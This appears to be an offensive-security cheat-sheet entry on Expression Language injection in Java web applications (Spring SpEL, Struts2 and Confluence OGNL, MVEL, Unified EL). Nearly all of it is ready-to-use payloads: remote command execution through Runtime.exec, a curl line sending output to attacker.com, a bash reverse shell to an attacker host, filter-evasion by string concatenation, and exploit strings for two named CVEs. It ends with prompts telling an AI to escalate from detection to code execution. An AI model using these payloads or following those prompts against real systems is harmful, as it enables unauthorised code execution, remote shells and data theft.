---
id: "el-injection"
title: "Expression Language (EL/OGNL/SpEL) Injection"
type: "technique"
category: "web-application"
subcategory: "injection"
tags: ["el-injection", "ognl", "spel", "spring", "struts", "confluence", "rce", "java", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["ssti-payloads", "deserialization", "command-injection-payloads"]
difficulty: "advanced"
updated: "2026-04-14"
---

# Expression Language (EL/OGNL/SpEL) Injection

## Why EL Injection is Critical
EL injection in Java apps almost always leads to RCE. Struts2 OGNL and Confluence bugs have been some of the highest-paid bounties in history. $5k–$50k+.

## Detection Payloads
```
# Universal detection (try all):
${7*7}        → 49 = vulnerable to EL
#{7*7}        → 49 = vulnerable to EL
%{7*7}        → 49 = OGNL
${7*'7'}      → 7777777 = string multiplication
```

## Spring Expression Language (SpEL)
```
# RCE:
${T(java.lang.Runtime).getRuntime().exec('id')}
#{T(java.lang.Runtime).getRuntime().exec('id')}

# With output capture:
${T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/$(whoami)')}

# ProcessBuilder (more control):
${T(java.lang.ProcessBuilder).new(new String[]{'cat','/etc/passwd'}).start()}

# Reverse shell:
#{T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/ATTACKER/4444 0>&1'})}

# Evasion via concatenation:
${T(Class).forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',''.class).invoke(T(Class).forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(null),'id')}

# Spring-specific info disclosure:
${applicationScope}
${pageContext.request.getSession().getServletContext().getClassLoader()}
```

## OGNL (Struts2 / Confluence)
```
# Classic Struts2 RCE (CVE-2017-5638 pattern):
%{(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}

# Confluence OGNL (CVE-2022-26134):
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream(),'utf-8')).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader('X-Cmd-Response',#a))}

# Simpler OGNL:
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).redirectErrorStream(true).start()}
```

## MVEL
```
@{Runtime.getRuntime().exec('id')}
@{new java.lang.ProcessBuilder(new String[]{'id'}).start()}
```

## JBoss / Unified EL
```
#{''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'id')}

${''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("id")')}
```

## Where to Find This
- **Spring Framework** apps (error pages, form validation messages, Thymeleaf templates)
- **Apache Struts2** (Content-Type header, filename in multipart)
- **Atlassian Confluence** (URL path, macro parameters)
- **JSP/JSF** apps with user-controlled template data
- **JBoss/WildFly** admin panels
- Error messages that evaluate expressions
- Spring Boot actuator endpoints

## Deep Dig Prompts
```
Given this Java web application [describe]:
1. Test ${7*7} and #{7*7} and %{7*7} in every input field
2. Check error pages for expression evaluation
3. If Spring: test SpEL in form validation, path variables, headers
4. If Struts2: test Content-Type and filename for OGNL
5. If Confluence: test URL path for OGNL injection
6. Escalate from detection to RCE using Runtime.exec()
```

## Tools
- Burp Suite with EL/OGNL payloads
- nuclei templates for Spring/Struts/Confluence
- Struts-pwn (Struts2 OGNL exploitation)
- tplmap (template/EL injection detection)
- ysoserial (serialization chains in EL contexts)
- Interactsh for blind detection
